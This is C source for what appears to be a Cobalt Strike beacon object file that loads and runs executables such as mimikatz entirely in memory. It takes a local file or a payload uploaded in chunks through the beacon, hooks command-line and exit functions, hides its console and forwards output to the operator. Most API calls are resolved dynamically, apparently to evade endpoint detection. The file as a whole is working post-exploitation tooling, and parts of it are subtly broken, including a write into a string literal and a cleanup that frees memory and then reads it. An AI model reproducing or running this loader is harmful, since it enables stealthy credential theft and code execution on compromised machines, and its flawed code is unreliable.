#include <windows.h>
#include <stdio.h>
#include "bofdefs.h"
#include "beacon.h"
char* parameter = "mimikatz.exe coffee exit";
wchar_t* cmdWidh = NULL;
wchar_t** cmdWidhArgv = NULL;
int cmdWidhArgvInt = 0;
char** cmdAnsiArgv = NULL;
BOOL hijackCmdline = FALSE;
#define _WAIT_TIMEOUT 7000

FILE* __cdecl __acrt_iob_funcs(int index)
{
	return &__iob_func()[index];
}
#define stdin (__acrt_iob_funcs(0))
#define stdout (__acrt_iob_funcs(1))
#define stderr (__acrt_iob_funcs(2))
LPWSTR hookGetCommandLineW()
{
	return cmdWidh;
}
LPSTR hookGetCommandLineA()
{
	return parameter;
}
char*** __cdecl hook__p___argv(void)
{
	return &cmdAnsiArgv;
}
wchar_t*** __cdecl hook__p___wargv(void)
{
	return &cmdWidhArgv;
}
int* __cdecl hook__p___argc(void)
{
	return &cmdWidhArgvInt;
}
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
	*_Argc = cmdWidhArgvInt;
	*_Argv = cmdWidhArgv;

	return 0;
}
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
	*_Argc = cmdWidhArgvInt;
	*_Argv = cmdAnsiArgv;
	return 0;
}
_onexit_t __cdecl hook_onexit(_onexit_t function)
{
	return 0;
}
int __cdecl hookatexit(void(__cdecl* func)(void))
{
	return 0;
}
int __cdecl hookexit(int status)
{
	ExitThread(0);
	return 0;
}
void __stdcall hookExitProcess(UINT statuscode)
{
	ExitThread(0);
}
typedef struct _BASE_RELOCATION_ENTRY {
	WORD Offset : 12;
	WORD Type : 4;
} BASE_RELOCATION_ENTRY;

PIMAGE_DATA_DIRECTORY GetPeDataDir(PIMAGE_NT_HEADERS pNtHeader, SIZE_T dataID) {
	if (dataID >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) {
		return NULL;
	}
	return (PIMAGE_DATA_DIRECTORY) & (pNtHeader->OptionalHeader.DataDirectory[dataID]);
}

void masqueradeParameters() {
	// 将参数转换为宽字符串
	int charSize = MultiByteToWideChar(CP_UTF8, 0, parameter, -1, NULL, 0);
	cmdWidh = calloc(charSize + 1, sizeof(wchar_t));
	MultiByteToWideChar(CP_UTF8, 0, parameter, -1, cmdWidh, charSize);

	// 解析宽字符串参数
	cmdWidhArgv = CommandLineToArgvW(cmdWidh, &cmdWidhArgvInt);

	// 计算转换为 ANSI 字符串所需的内存大小
	int retval;
	int memsize = cmdWidhArgvInt * sizeof(LPSTR);
	for (int i = 0; i < cmdWidhArgvInt; ++i) {
		retval = WideCharToMultiByte(CP_UTF8, 0, cmdWidhArgv[i], -1, NULL, 0, NULL, NULL);
		memsize += retval;
	}

	// 分配内存存储 ANSI 版本的参数
	cmdAnsiArgv = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);
	int bufLen = memsize - cmdWidhArgvInt * sizeof(LPSTR);
	LPSTR buffer = ((LPSTR)cmdAnsiArgv) + cmdWidhArgvInt * sizeof(LPSTR);

	// 将宽字符串参数转换为 ANSI 并存储
	for (int i = 0; i < cmdWidhArgvInt; ++i) {
		retval = WideCharToMultiByte(CP_UTF8, 0, cmdWidhArgv[i], -1, buffer, bufLen, NULL, NULL);
		cmdAnsiArgv[i] = buffer;
		buffer += retval;
		bufLen -= retval;
	}

	// 标记参数已修改
	hijackCmdline = TRUE;
}

BOOL FixIAT(ULONG_PTR pImageBase, formatp* buffer) {
	//printf("[*] Fix Import Table\n");
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
	PIMAGE_DATA_DIRECTORY pImportDir = GetPeDataDir(pNtHeader, IMAGE_DIRECTORY_ENTRY_IMPORT);
	if (pImportDir == NULL) {
		return FALSE;
	}

	ULONG_PTR maxSize = pImportDir->Size;
	ULONG_PTR pImportTablesAddress = pImportDir->VirtualAddress;
	PIMAGE_IMPORT_DESCRIPTOR pImportTable = NULL;
	ULONG_PTR parsedSize = 0;
	for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImportTable = (PIMAGE_IMPORT_DESCRIPTOR)((ULONG_PTR)pImageBase + pImportTablesAddress + parsedSize);
		if (pImportTable->OriginalFirstThunk == NULL && pImportTable->FirstThunk == NULL) {
			break;
		}

		LPSTR importName = (LPSTR)((ULONG_PTR)pImageBase + pImportTable->Name);
		//BeaconPrintf(CALLBACK_OUTPUT, "00000000000 [+] Import Name: %s\n", importName);

		ULONG_PTR pINT = pImportTable->OriginalFirstThunk;
		ULONG_PTR pIAT = pImportTable->FirstThunk;
		ULONG_PTR offsetINT = 0;
		ULONG_PTR offsetIAT = 0;

		while (TRUE) {
			PIMAGE_THUNK_DATA pCurrentINT = (PIMAGE_THUNK_DATA)((ULONG_PTR)pImageBase + pINT + offsetINT);
			PIMAGE_THUNK_DATA pCurrentIAT = (PIMAGE_THUNK_DATA)((ULONG_PTR)pImageBase + pIAT + offsetIAT);

			// Ordinal处理
			if (pCurrentINT->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || pCurrentINT->u1.Ordinal & IMAGE_ORDINAL_FLAG64) {
				SIZE_T pWINAPI = (SIZE_T)GetProcAddress(LoadLibraryA(importName), (char*)(pCurrentINT->u1.Ordinal & 0xFFFF));
				if (pWINAPI != 0) {
					pCurrentIAT->u1.Function = pWINAPI;
				}
			}

			if (pCurrentIAT->u1.Function == NULL) {
				break;
			}

			if (pCurrentIAT->u1.Function == pCurrentINT->u1.Function) {
				PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((ULONG_PTR)pImageBase + pCurrentINT->u1.AddressOfData);
				LPSTR funcName = (LPSTR)pImportByName->Name;
				SIZE_T pWINAPI = (SIZE_T)GetProcAddress(LoadLibraryA(importName), funcName);
				//BeaconPrintf(CALLBACK_OUTPUT, "%s", funcName);
				if (hijackCmdline && _stricmp(funcName, "GetCommandLineA") == 0)
					pCurrentIAT->u1.Function = (size_t)hookGetCommandLineA;
				else if (hijackCmdline && _stricmp(funcName, "GetCommandLineW") == 0)
					pCurrentIAT->u1.Function = (size_t)hookGetCommandLineW;
				else if (hijackCmdline && _stricmp(funcName, "__wgetmainargs") == 0)
					pCurrentIAT->u1.Function = (size_t)hook__wgetmainargs;
				else if (hijackCmdline && _stricmp(funcName, "__getmainargs") == 0)
					pCurrentIAT->u1.Function = (size_t)hook__getmainargs;
				else if (hijackCmdline && _stricmp(funcName, "__p___argv") == 0)
					pCurrentIAT->u1.Function = (size_t)hook__p___argv;
				else if (hijackCmdline && _stricmp(funcName, "__p___wargv") == 0)
					pCurrentIAT->u1.Function = (size_t)hook__p___wargv;
				else if (hijackCmdline && _stricmp(funcName, "__p___argc") == 0)
					pCurrentIAT->u1.Function = (size_t)hook__p___argc;
				// Hook它的exit相关函数
				else if (hijackCmdline && (_stricmp(funcName, "exit") == 0 || _stricmp(funcName, "_Exit") == 0 || _stricmp(funcName, "_exit") == 0 || _stricmp(funcName, "quick_exit") == 0))
					pCurrentIAT->u1.Function = (size_t)hookexit;
				else if (hijackCmdline && (_stricmp(funcName, "ExitProcess") == 0) || _stricmp(funcName, "ExitThread") == 0)
					pCurrentIAT->u1.Function = (size_t)hookExitProcess;
				else
					pCurrentIAT->u1.Function = pWINAPI;
			}
			offsetIAT += sizeof(IMAGE_THUNK_DATA);
			offsetINT += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL FixReloc(ULONG_PTR newImageBase, ULONG_PTR oldImageBase, BYTE* pImageBase, ULONG_PTR fileSize) {
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pImageBase + ((PIMAGE_DOS_HEADER)pImageBase)->e_lfanew);
	PIMAGE_DATA_DIRECTORY pRelocDir = GetPeDataDir(pNtHeader, IMAGE_DIRECTORY_ENTRY_BASERELOC);
	if (pRelocDir == NULL) {
		return FALSE;
	}

	// Get RelocTable' Size, Addr
	SIZE_T maxSize = pRelocDir->Size;
	SIZE_T pRelocTables = pRelocDir->VirtualAddress;

	SIZE_T parsedSize = 0;
	PIMAGE_BASE_RELOCATION pBaseReloc = NULL;
	for (; parsedSize < maxSize; parsedSize += pBaseReloc->SizeOfBlock) {
		pBaseReloc = (PIMAGE_BASE_RELOCATION)((SIZE_T)pImageBase + pRelocTables + parsedSize);
		if (pBaseReloc->VirtualAddress == NULL || pBaseReloc->SizeOfBlock == 0) {
			break;
		}

		SIZE_T relocEntryNum = (pBaseReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(BASE_RELOCATION_ENTRY);
		SIZE_T page = pBaseReloc->VirtualAddress;
		BASE_RELOCATION_ENTRY* entry = (BASE_RELOCATION_ENTRY*)((SIZE_T)pBaseReloc + sizeof(IMAGE_BASE_RELOCATION));
		for (SIZE_T i = 0; i < relocEntryNum; i++) {
			SIZE_T offset = entry->Offset;
			SIZE_T type = entry->Type;
			SIZE_T reloc = page + offset;
			if (entry == NULL || type == 0) {
				break;
			}

			if (reloc >= fileSize) {
				return FALSE;
			}
			SIZE_T* relocAddress = (SIZE_T*)((SIZE_T)pImageBase + reloc);
			//printf("\t[+] Apply Reloc Field at %x\n", relocAddress);

			(*relocAddress) = ((*relocAddress) - oldImageBase + newImageBase);
			entry = (BASE_RELOCATION_ENTRY*)((SIZE_T)entry + sizeof(BASE_RELOCATION_ENTRY));
		}
	}
	return (parsedSize != 0);
}

void outputForwardBeacon(struct MemAddrs* pMemAddrs) {
	BOOL suc = AllocConsole();

	ShowWindow(GetConsoleWindow(), SW_HIDE);

	freopen_s(&pMemAddrs->fout, "CONOUT$", "r+", stdout);
	freopen_s(&pMemAddrs->ferr, "CONOUT$", "r+", stderr);
	
	pMemAddrs->bCloseFHandles = TRUE;

	SECURITY_ATTRIBUTES sao = { sizeof(sao),NULL,TRUE };
	CreatePipe(&pMemAddrs->hreadout, &pMemAddrs->hwriteout, &sao, 0);

	SetStdHandle(STD_OUTPUT_HANDLE, pMemAddrs->hwriteout);
	SetStdHandle(STD_ERROR_HANDLE, pMemAddrs->hwriteout);

	pMemAddrs->fo = _open_osfhandle((intptr_t)(pMemAddrs->hwriteout), _O_TEXT);

	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->fout));
	_dup2(pMemAddrs->fo, _fileno(pMemAddrs->ferr));

	_dup2(pMemAddrs->fo, 1);
	_dup2(pMemAddrs->fo, 2);

	return;
}

// 读取可执行文件
BYTE* MapFileToMemory(const char* exeFilePath) {
	HANDLE hFile = (HANDLE(WINAPI*)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateFileA")(exeFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	//HANDLE hFile = CreateFileA(exeFilePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		return NULL;
	}
	HANDLE hMap = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
	SIZE_T fileSize = (SIZE_T(WINAPI*)(HANDLE, LPDWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "GetFileSize")(hFile, NULL);
	//SIZE_T fileSize = GetFileSize(hFile, NULL);
	BYTE* buffer = (BYTE*)malloc(fileSize);
	memset(buffer, 0, fileSize);
	if ((BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress(LoadLibraryA("kernel32.dll"), "ReadFile")(hFile, buffer, fileSize, NULL, NULL)) {
		CloseHandle(hFile);
		CloseHandle(hMap);
		return buffer;
	}

	if (hFile != INVALID_HANDLE_VALUE)CloseHandle(hFile);
	if (hMap != INVALID_HANDLE_VALUE) CloseHandle(hMap);
	if (buffer != buffer)free(buffer);
	return NULL;
}

int LoadPe(BYTE* buffer, formatp* outputBuffer) {
	struct MemAddrs* pMemAddrs = malloc(sizeof(struct MemAddrs));
	// -----------------加载PE文件-----------------
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)buffer;
	PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((SIZE_T)buffer + pDosHeader->e_lfanew);
	if (pNtHeader->Signature != IMAGE_NT_SIGNATURE) { // 判断是否为PE文件
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Invalid PE File");
		goto _CleanUp;
	}
	PIMAGE_DATA_DIRECTORY pRelocDir = GetPeDataDir(pNtHeader, IMAGE_DIRECTORY_ENTRY_BASERELOC); // 获取重定位表
	if (pRelocDir == NULL) {
		goto _CleanUp;
	}

	ULONG_PTR preferAddress = pNtHeader->OptionalHeader.ImageBase; // 获取首选基址
	
	// -----------------VirtualAlloc-----------------
	BYTE* pImageBase = NULL;
	(NTSTATUS(WINAPI*)(HANDLE, PVOID))GetProcAddress(LoadLibraryA("ntdll.dll"), "NtUnmapViewOfSection")((HANDLE)-1, (PVOID)pNtHeader->OptionalHeader.ImageBase);
	pImageBase = (BYTE*)(void*(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc")(pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	//pImageBase = (BYTE*)VirtualAlloc(pNtHeader->OptionalHeader.ImageBase, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pImageBase == NULL && pRelocDir == NULL) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to allocate memory");
		goto _CleanUp;
	}
	else if (pImageBase == NULL && pRelocDir != NULL) {
		pImageBase = (BYTE*)(void* (WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualAlloc")(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		//pImageBase = (BYTE*)VirtualAlloc(NULL, pNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pImageBase == NULL) {
			BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to allocate memory");
			goto _CleanUp;
		}
	}
	pNtHeader->OptionalHeader.ImageBase = pImageBase;
	
	// -----------------映射Section-----------------
	memcpy(pImageBase, buffer, pNtHeader->OptionalHeader.SizeOfHeaders);
	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE*)pNtHeader + sizeof(IMAGE_NT_HEADERS));
	for (SIZE_T i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
		//BeaconPrintf(CALLBACK_OUTPUT, "\t[+] Mapping Section Name: %s\n", pSectionHeader[i].Name);
		memcpy(
			(LPVOID)((ULONG_PTR)pImageBase + pSectionHeader[i].VirtualAddress),
			(LPVOID)((SIZE_T)buffer + pSectionHeader[i].PointerToRawData),
			pSectionHeader[i].SizeOfRawData
		);
	}
	
	masqueradeParameters();
	outputForwardBeacon(pMemAddrs);

	// -----------------修复IAT-----------------
	if (!FixIAT(pImageBase, outputBuffer)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to fix IAT");
		goto _CleanUp;
		return -1;
	}

	// -----------------修复重定位表-----------------
	ULONG_PTR retAddress = (ULONG_PTR)(pImageBase + pNtHeader->OptionalHeader.AddressOfEntryPoint);
	if ((ULONG_PTR)pImageBase != preferAddress) {
		FixReloc((ULONG_PTR)pImageBase, (ULONG_PTR)preferAddress, pImageBase, pNtHeader->OptionalHeader.SizeOfImage);
	}

	BOOL isTimeout = FALSE; // 是否超时
	DWORD remainingDataOutput = 0; // 管道剩余数据
	DWORD bytesRead = 0; // 读取的字节数
	BOOL isThreadFinished = FALSE; // Thread执行完成
	DWORD waitResult = -1; // WaitForSingleObject的结果
	LARGE_INTEGER frequency, before, after;
	(BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddress(LoadLibraryA("kernel32.dll"), "QueryPerformanceFrequency")(&frequency); // 获取CPU频率
	(BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddress(LoadLibraryA("kernel32.dll"), "QueryPerformanceCounter")(&before); // 获取开始时间
	
	// -----------------创建线程-----------------
	(VOID(WINAPI*)(DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "Sleep")(1000);
	//PDWORD oldProtect = NULL;
	//(BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD, PDWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualProtect")(pImageBase, pNtHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect);
	//VirtualProtect(pImageBase, pNtHeader->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, 0);
	
	HANDLE hThread = (HANDLE(WINAPI*)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "CreateThread")(0, 0, (LPTHREAD_START_ROUTINE)retAddress, 0, 0, 0);
	(VOID(WINAPI*)(DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "Sleep")(1000);
	
	// -----------------读取管道数据-----------------
	unsigned char* recvBuffer = calloc(8192, sizeof(unsigned char)); // 接收缓冲区
	do {
		(BOOL(WINAPI*)(LARGE_INTEGER*))GetProcAddress(LoadLibraryA("kernel32.dll"), "QueryPerformanceCounter")(&after); // 获取结束时间
		if (((after.QuadPart - before.QuadPart) / frequency.QuadPart) > 8) {
			isTimeout = TRUE;
			(BOOL(WINAPI*)(HANDLE, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "TerminateThread")(hThread, 0);
		}
		// 等待线程结束
		waitResult = (DWORD(WINAPI*)(HANDLE, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "WaitForSingleObject")(hThread, _WAIT_TIMEOUT);
		switch (waitResult) {
		case WAIT_ABANDONED:
			break;
		case WAIT_FAILED:
			break;
		case _WAIT_TIMEOUT:
			break;
		case WAIT_OBJECT_0:
			isThreadFinished = TRUE;
		}
		
			
		// 读取管道数据
		(BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPDWORD, LPDWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "PeekNamedPipe")((VOID*)pMemAddrs->hreadout, NULL, 0, NULL, &remainingDataOutput, NULL);
		//PeekNamedPipe((VOID*)pMemAddrs->hreadout, NULL, 0, NULL, &remainingDataOutput, NULL);
		//BeaconPrintf(CALLBACK_OUTPUT, "Peek bytes available: %d!\nGetLastError: %d", remainingDataOutput, GetLastError());
		if (remainingDataOutput) {
			memset(recvBuffer, 0, 8192);
			bytesRead = 0;(BOOL(WINAPI*)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED))GetProcAddress(LoadLibraryA("kernel32.dll"), "ReadFile")((VOID*)pMemAddrs->hreadout, recvBuffer, 8192 - 1, &bytesRead, NULL);
			//ReadFile((VOID*)pMemAddrs->hreadout, recvBuffer, 8192 - 1, &bytesRead, NULL);
			BeaconPrintf(CALLBACK_OUTPUT, "%s", recvBuffer);
		}
	} while (!isThreadFinished || remainingDataOutput);

	if (isTimeout) BeaconPrintf(CALLBACK_OUTPUT, "[-] Thread execution timeout");
	else BeaconPrintf(CALLBACK_OUTPUT, "[+] Thread execution completed");
	goto _CleanUp;

_CleanUp:
	// -----------------清理-----------------
	if (pMemAddrs->bCloseFHandles) {
		fclose(pMemAddrs->fout);
		fclose(pMemAddrs->ferr);
		CloseHandle(pMemAddrs->hreadout);
		CloseHandle(pMemAddrs->hwriteout);
		(BOOL(WINAPI*)())GetProcAddress(LoadLibraryA("kernel32.dll"), "FreeConsole")();
		free(pMemAddrs);
	}
	if (pMemAddrs->fo != -1) {
		_close(pMemAddrs->fo);
	}
	if (recvBuffer != NULL) {
		free(recvBuffer);
	}
	if (pImageBase != NULL) {
		(int(WINAPI*)(LPVOID, SIZE_T, DWORD))GetProcAddress(LoadLibraryA("kernel32.dll"), "VirtualFree")(pImageBase, 0, MEM_RELEASE);
		//VirtualFree(pImageBase, 0, MEM_RELEASE);
	}
	return 0;
}

void go(char* buff, int len) {
	formatp outputBuffer;
	BeaconFormatAlloc(&outputBuffer, 4096);

	
	BOOL isLocal = FALSE; // 读取选项
	BYTE* buffer = NULL; // 读取的文件内容
	SIZE_T state = 0; // 远程传输状态
	SIZE_T totalSize = 0; // 文件总大小
	SIZE_T chunkSize = 0; // 传输块大小
	SIZE_T index = 0; // 传输块索引
	BYTE* chunk = NULL; // 传输块内容
	CHAR* xor = 0; // 加密密钥


	datap parser;
	BeaconDataParse(&parser, buff, len);			
	isLocal = BeaconDataInt(&parser);

	// 本地读取
	if (isLocal) {
		LPCSTR exeFilePath = BeaconDataExtract(&parser, NULL);
		char* parameterTmp = BeaconDataExtract(&parser, NULL);
		//*xor = BeaconDataExtract(&parser, NULL);
		sprintf(parameter, "[RUN] %s", parameterTmp);
		//BeaconPrintf(CALLBACK_OUTPUT, "%s", parameter);
		// ----------读取exe文件----------
		BYTE* buffer = MapFileToMemory(exeFilePath);
		if (buffer == NULL) {
			BeaconPrintf(CALLBACK_ERROR, "Failed to read file %s", exeFilePath);
			return;
		}
		LoadPe(buffer, &outputBuffer);
	}
	else
	{
		// 远程传输
		state = BeaconDataInt(&parser);
		totalSize = BeaconDataInt(&parser);
		index = BeaconDataInt(&parser);
		chunkSize = BeaconDataInt(&parser);
		chunk = (BYTE*)BeaconDataExtract(&parser, NULL);
		char* parameterTmp = BeaconDataExtract(&parser, NULL);
		sprintf(parameter, "[RUN] %s", parameterTmp);
		//BeaconPrintf(CALLBACK_OUTPUT, "%s", parameter);
		char* fileMapName = "admin";
		
		// ----------创建文件映射----------
		HANDLE hMapFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, totalSize, fileMapName);
		if (hMapFile != NULL) {
			if (GetLastError() == 183 || index == 0) // ERROR_ALREADY_EXISTS
				BeaconPrintf(CALLBACK_OUTPUT, "[+] FileMapping %s already exists", fileMapName);
			else 
				BeaconPrintf(CALLBACK_OUTPUT, "[+] CreateFileMapping %s success, size: %d", fileMapName, totalSize);
		}
		else { // 创建失败
			BeaconPrintf(CALLBACK_ERROR, "[!] Could not CreateFileMapping %s, ERROR ID: %d, Exiting BOF..", fileMapName, GetLastError());
			return;
		}

		// 映射内存
		BYTE* mapAddress = MapViewOfFile(hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, totalSize);
		if (mapAddress != NULL) {
			if (index == 0) BeaconPrintf(CALLBACK_OUTPUT, "[+] MapViewOfFile %s success, size: %d", fileMapName, totalSize);
		}
		else {
			BeaconPrintf(CALLBACK_ERROR, "[!] Could not MapViewOfFile %s, ERRO IDR: %d，Exiting BOF...", fileMapName, GetLastError());
			CloseHandle(mapAddress);
			CloseHandle(hMapFile);
			return;
		}

		memcpy((SIZE_T)mapAddress + index, chunk, chunkSize);
		BeaconPrintf(CALLBACK_OUTPUT, "[+] ----- Uploading (%d/%d) -----", index + chunkSize, totalSize);
		if (state == 1) {
			BeaconPrintf(CALLBACK_OUTPUT, "[+] Upload shellcode completed，totalSize %d", totalSize);
			BYTE* copyBuffer = (BYTE*)VirtualAlloc(NULL, totalSize + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			memcpy(copyBuffer, mapAddress, totalSize);
			LoadPe(copyBuffer, &outputBuffer);
			CloseHandle(hMapFile);
			CloseHandle(mapAddress);
		}
	}

	return;
}

